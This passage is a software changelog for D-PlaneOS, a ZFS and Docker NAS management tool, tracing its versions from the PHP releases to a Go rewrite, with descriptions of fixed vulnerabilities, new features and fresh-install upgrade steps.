- `auth.php` execCommand() security theater (replaced by Go input validators)
- Dead `navigation.js` RBAC nav system (replaced by static HTML nav + `nav-flyout.js`)

### Fixed

- **Schema initialization** — v1.x required manual migration scripts; v2.0.0 auto-creates all tables on first start
- **NFS list 500 error** — `exportfs` not found now returns empty list instead of Internal Server Error
- **RBAC time.Time scan error** — SQLite TEXT columns now correctly mapped to Go string types
- **12 orphaned pages** — pages existed with working backends but were unreachable from navigation; all now linked
- **pageMap sync** — inline JS page-to-section mapping now covers all 36 navigable pages
- **Anti-flash on injected pages** — duplicate `<style>` tags cleaned up

### ⚠️ Breaking Changes

- **Not an in-place upgrade from v1.x.** Fresh install required. Data (ZFS pools, shares, Docker containers) is preserved on disk — only the management layer changes.
- **No PHP dependency.** Systems with only the Go binary can run D-PlaneOS.
- **API paths changed.** v1.x used `/api/storage/files.php?action=list`; v2.0.0 uses `/api/files/list`. Frontend handles this transparently.

---

## v1.14.0-OMEGA (2026-02-01) — **"OMEGA Edition"**

First fully production-ready PHP release. Fixes 7 critical infrastructure bugs that caused silent failures on fresh installs.

### Fixed (7 Critical Infrastructure Bugs)

1. **www-data sudo permissions missing** (CRITICAL) — every privileged command failed silently; added comprehensive sudoers config
2. **SQLite write permissions** (CRITICAL) — first login always failed; installer now sets correct ownership on runtime directories
3. **Login loop on cold start** (HIGH) — dashboard rendered before auth check; added `body{display:none}` until session confirmed
4. **API timeout handling** (HIGH) — `iwlist scan` with no timeout hung entire FPM pool; all hardware detection now uses `timeout 3`
5. **Silent session expiry** (MEDIUM) — heartbeat polling detects expiry, auto-redirect to login
6. **No loading feedback** (LOW) — global LoadingOverlay with spinner and double-click prevention
7. **Style flash on load** (LOW) — styles injected before DOM render

### Added

- Server-side auth checks on all API endpoints
- 1-hour session timeout with inactivity enforcement
- 401 JSON responses for unauthorized access
- Removed `Access-Control-Allow-Origin: *` (same-origin enforced)
- Post-install integrity checker (`scripts/audit-dplaneos.sh`)
- Reproducible build script (`scripts/CREATE-OMEGA-PACKAGE.sh`)

---

## v1.14.0 (2026-01-31) — **"UI Revolution"**

Complete frontend rebuild: 10 fully functional pages, responsive, customizable.

### Added

- 10 management pages wired to 16 backend APIs (Dashboard, Storage, Docker, Shares, Network, Users, Settings, Backup, Files, Customize)
- Customization system: 10+ color parameters, sidebar width slider, custom CSS upload, 3 preset themes, theme export/import
- Frontend JS modules: `main.js`, `sidebar.js`, `pool-wizard.js`, `hardware-monitor.js`, `ux-feedback.js`
- CSS theme system with CSS variables

### Changed

- Frontend moved from PHP-rendered pages to static HTML + vanilla JS SPA
- All pages share single `main.js` app shell

---

## v1.13.1 (2026-01-31) — **"Hardening Pass"**

### Added

- Docker brutal cleanup on restore
- Log rotation with `copytruncate` strategy
- ZFS auto-expand trigger after disk replacement

### Fixed

- Edge cases in backup/restore workflow
- Log file handling during active operations
- Pool expansion detection after hardware changes

---

## v1.13.0 (2026-01-31) — **"Future-Proof Installer"**

### Added

- Dynamic PHP version detection (no more hardcoded package lists)
- Automatic PHP socket location detection
- Pre-flight validation: disk space (20 GB), memory (4 GB), connectivity, port conflicts, OS compatibility

### Changed

- Complete installer rewrite replacing all hardcoded dependency versions
- Improved ARM/Raspberry Pi support

### Fixed

- Installer hanging on missing dependencies
- Kernel headers missing for ZFS on ARM
- Docker repository configuration issues
- PHP version detection failures on newer Debian/Ubuntu

---

## v1.12.0 (2026-01-31) — **"The Big Fix"**

45 vulnerabilities from comprehensive penetration test.

### Fixed (10 Critical)

1. **C-01: Systemic XSS** — 282 unescaped interpolation points wrapped with `esc()` and `escJS()`
2. **C-02: SMB command injection** — raw `$_GET['name']` in `shell_exec`; applied `escapeshellarg()`, password piped via temp file
3. **C-03: Network command injection** — unescaped IPs in `exec()`; applied `filter_var(FILTER_VALIDATE_IP)` + `escapeshellarg()`
4. **C-04: Disk replacement dual injection** — command injection + SQL injection in same endpoint; fixed both
5. **C-05: ZFS admin bypass** — `create` action missing from admin whitelist; any user could create pools
6. **C-06: Backup path traversal** — `../` in filename could delete files outside backup dir; applied `basename()`
7. **C-07: SSE stream corruption** — HTTP router dumped JSON into SSE stream; added include guard
8. **C-08: NFS cp not in sudoers** — NFS export updates silently failed; added sudoers entry
9. **C-09: Auto-backup auth failure** — HTTP calls with no session cookie; implemented service-token system
10. **C-10: Notifications system broken** — schema mismatch, no router, no frontend path; fixed all three

### Fixed (7 High Severity)

- H-11 through H-17: dashboard metrics, pool wizard, share cards, repository list, ZFS scrub status, Docker quick actions — all repaired

### Added

- SSH key validation, Tailscale configurator
- Complete XSS mitigation framework (`utils.js`)
- Rate limiting for all state-changing operations
- Input validation across entire codebase

---

## v1.11.0 (2026-01-31) — **"Vibecoded Security Theater Fix"**

### Fixed (CRITICAL)

- **Command injection via flawed string check** — `execCommand()` checked if the *string* `"escapeshellarg"` appeared in the command, not whether arguments were actually escaped. 108 vulnerable call sites across the entire API surface. Complete rewrite with strict command whitelisting, proper metacharacter blocking, and comprehensive audit logging.

---

## v1.10.0 (2026-01-31) — **"Smart State Polling & One-Click Updates"**

### Added

- ETag-based smart polling (95% bandwidth reduction, 88% CPU reduction)
- ZFS snapshot-based update system with automatic rollback
- Update UI with real-time progress via SSE
- Pre-flight checks, smoke tests, automatic rollback on failure

### Changed

- License: MIT → PolyForm Noncommercial License 1.0.0

---

## v1.9.0 (2026-01-30) — **"RBAC & Security Fixes"**

### Added

- Role-Based Access Control: Admin, User, Readonly roles
- User management UI and API
- Safe SMB user management wrapper scripts
- Database migration system

### Fixed (7 Critical Security Issues)

1. Session fixation — sessions not regenerated after login
2. Wildcard sudoers rules — overly permissive `*` wildcards
3. Missing action parameter whitelist
4. Atomic file write race conditions
5. Docker Compose YAML injection
6. Weak random number generation (`rand()` → `random_int()`)
7. Log lines parameter unbounded (DoS risk) — capped at 10,000

---

## v1.8.0 (2026-01-28) — **"Power User Release"**

Every tab now functional — zero UI changes.

### Added

- **File browser** — list, upload, download, preview, search, create/delete/rename/move/copy folders, chmod, chown; restricted to `/mnt`
- **ZFS native encryption** — create encrypted datasets, load/unload keys, change passwords, bulk unlock, boot-time detection
- **System service control** — start/stop/restart/enable/disable systemd services, view status and logs
- **Real-time monitoring** — per-core CPU, memory, network, disk I/O, process list, system info from `/proc`

Result: all 14 tabs functional.

---

## v1.7.0 (2026-01-28) — **"The Paranoia Update"**

### Added

- **UPS/USV management** — NUT integration, real-time battery monitoring, auto shutdown at threshold, multi-UPS support
- **Automatic snapshot management** — hourly/daily/weekly/monthly schedules, configurable retention, automatic cleanup
- **System log viewer** — journalctl, service logs, audit log, ZFS events, Docker logs — all in browser

---

## v1.6.0 (2026-01-28) — **"Disk Health & Notifications"**

### Added

- SMART disk health monitoring with temperature alerts
- Disk replacement tracking and maintenance log
- System-wide notification center (slide-out panel, priority levels, categories, 7-day auto-cleanup)

---

## v1.5.1 (2026-01-28) — **"User Quotas"**

### Added

- Per-user ZFS quotas with real-time usage tracking
- Color-coded progress bars (green/yellow/red)
- Comprehensive responsive design audit

---

## v1.5.0 (2026-01-28) — **"UI/UX Stability"**

### Fixed

- Modal z-index overlap
- Button overflow on small screens
- Sidebar content overlap
- Chart layout shift

---

## v1.4.1 (2026-01-28) — **"UX & Reliability"**

### Added

- Visual replication progress with real-time updates
- Replication health alerts with webhook notifications

---

## v1.4.0 (2026-01-28) — **"Enterprise-Ready"**

### Added

- Least-privilege sudoers configuration with explicit allow-list
- `THREAT-MODEL.md` and `RECOVERY.md` documentation

---

## v1.3.1 (2026-01-28) — **"Security Hardening"**

### Added

- Enhanced `execCommand()` with input validation and injection detection
- Database integrity checks, read-only fallback on corruption
- API versioning (`/api/v1/`)

---

## v1.3.0 (2026-01-27) — **"Feature Release"**

### Added

- ZFS replication (send/receive to remote hosts)
- Alert system (Discord/Telegram webhooks)
- Historical analytics (30-day retention)
- Scrub scheduling with cron
- Bulk snapshot operations

---

## v1.2.0 — **"Initial Public Release"**

### Added

- ZFS management (pools, datasets, snapshots)
- Container management (Docker integration)
- System monitoring (CPU/memory/disk stats)
- Security (session auth, audit logging, CSRF protection)

---

## Upgrade Path

### v1.14.0-OMEGA → v2.0.0

**This is not an in-place upgrade.** v2.0.0 is a complete rewrite.

```bash
# Fresh install
tar xzf dplaneos-v2.0.0-production-vendored.tar.gz
cd dplaneos && sudo make install
sudo systemctl start dplaneos
```

Your ZFS pools, datasets, shares, and Docker containers remain on disk. Only the management layer changes. Re-import your configuration as needed.

### v1.x → v1.14.0-OMEGA

```bash
cd dplaneos-v1.14.0-OMEGA
sudo bash install.sh    # Select option 1 (Upgrade)
```

---

## Support

**Security issues:** Report via GitHub issues with `security` label.
Response time: Critical 24h, High 72h, Medium/Low 1 week.

**Bug reports:** GitHub issue with version, steps to reproduce, and logs.

**Feature requests:** GitHub issue with `enhancement` label.
